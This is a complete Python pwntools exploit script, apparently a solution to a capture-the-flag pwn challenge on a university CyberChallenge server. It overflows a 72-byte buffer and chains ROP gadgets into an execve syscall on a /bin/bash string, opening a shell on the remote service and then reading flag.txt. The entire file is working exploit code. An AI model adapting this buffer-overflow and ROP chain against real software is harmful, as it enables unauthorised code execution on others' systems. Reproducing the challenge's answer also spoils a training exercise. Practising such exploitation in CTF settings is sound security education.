from pwn import *

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9200

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

offset = 72
payload = b"A" * offset

pop_rax = 0x000000000040119c    #: pop rax; ret; 
pop_rdi = 0x0000000000401196    #: pop rdi; ret; 
pop_rdx = 0x000000000040119a    #: pop rdx; ret; 
pop_rsi = 0x0000000000401198    #: pop rsi; ret; 
syscall = 0x000000000040119e    #: syscall; 
bin_bash = 0x0000000000402004

payload += p64(pop_rax) + p64(59)
payload += p64(pop_rdi) + p64(bin_bash)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx) + p64(0)
payload += p64(syscall)

conn.sendline(payload)

conn.sendline(b"cat flag.txt")
flag = conn.recvline().decode()

conn.close()
print(flag)